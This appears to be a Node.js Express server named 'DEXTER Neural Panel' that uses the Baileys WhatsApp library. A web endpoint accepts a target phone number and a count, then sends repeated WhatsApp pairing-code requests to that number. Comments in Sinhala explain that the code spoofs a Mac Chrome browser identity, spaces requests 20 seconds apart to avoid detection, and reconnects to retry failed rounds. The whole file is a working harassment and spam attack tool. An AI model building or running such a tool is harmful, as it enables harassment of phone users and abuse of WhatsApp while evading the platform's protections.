const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8000;

app.use(express.static('public'));

async function startAttack(target, count) {
    // Session දත්ත මතක තබා ගැනීමට
    const { state, saveCreds } = await useMultiFileAuthState('dexter_session');
    
    let sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        // සාමාන්‍ය පරිගණකයකින් එන බව පෙන්වීමට
        browser: ["Mac OS", "Chrome", "10.15.7"]
    });

    sock.ev.on('creds.update', saveCreds);

    for (let i = 0; i < count; i++) {
        try {
            // WhatsApp එකට අහු නොවී ඉන්න තත්පර 20ක විවේකයක්
            await delay(20000); 
            
            await sock.requestPairingCode(target.replace(/[^0-9]/g, ''));
            console.log(`[DEXTER] SUCCESS: ${i + 1} Payload sent to ${target}`);
            
        } catch (e) {
            console.log(`[RECONNECTING] Connection closed. Restarting link...`);
            // කනෙක්ෂන් එක ගියොත් ආයෙත් Socket එක පණගන්වන්න
            sock = makeWASocket({
                auth: state,
                logger: pino({ level: 'silent' }),
                browser: ["Mac OS", "Chrome", "10.15.7"]
            });
            i--; // අසාර්ථක වූ රවුම් එක ආයෙත් කරන්න
        }
    }
}

app.get('/attack', (req, res) => {
    const target = req.query.num;
    const count = parseInt(req.query.count) || 10;

    if (!target) return res.status(400).json({ error: "Target missing!" });

    startAttack(target, count);
    res.json({ status: "Injected", target: target });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'index.html'));
});

app.listen(PORT, () => console.log(`DEXTER Neural Panel running on ${PORT}`));
